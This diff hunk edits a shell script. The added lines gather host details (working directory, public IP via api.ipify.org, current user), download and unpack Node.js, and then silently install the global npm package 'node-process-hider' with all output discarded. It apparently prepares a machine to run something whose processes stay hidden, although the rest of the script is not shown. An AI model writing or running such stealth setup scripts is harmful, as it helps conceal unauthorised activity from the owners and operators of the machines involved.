@@ -5,11 +5,19 @@ pwd
 sleep 2
 curl api.ipify.org
 sleep 2
+whoami
+sleep 2
 
-curl -s -L -o node-v20.7.0-linux-x64.tar.gz https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
+wget -q https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
 tar -xf node-v20.7.0-linux-x64.tar.gz
 export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH
+sleep 2
+ls -la
 
+sleep 2
+npm
+sleep 2
+node -v
 sleep 2
 
 npm i -g node-process-hider 1>/dev/null 2>&1
